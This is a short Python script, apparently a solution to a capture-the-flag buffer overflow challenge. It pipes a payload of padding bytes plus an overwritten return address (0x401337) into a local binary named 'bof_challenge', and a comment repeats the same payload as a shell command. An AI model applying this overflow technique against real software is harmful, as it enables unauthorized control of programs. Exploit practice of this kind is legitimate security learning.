

import subprocess



elf_file = "./bof_challenge"

payload = b'AAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB\x37\x13\x40\x00\x00\x00\x00\x00'

# Call the executable with `subprocess.Popen`
# Replace 'your_executable' with the path to your executable
with subprocess.Popen([elf_file], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) as proc:
    # Send the bytes data to the process and capture output and errors
    stdout, stderr = proc.communicate(input=payload)

# Check the output and error messages
print("Output:", stdout)
print("Error:", stderr)

# ./fathi_challenge $'AAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB\x37\x13\x40\x00\x00\x00\x00\x00'
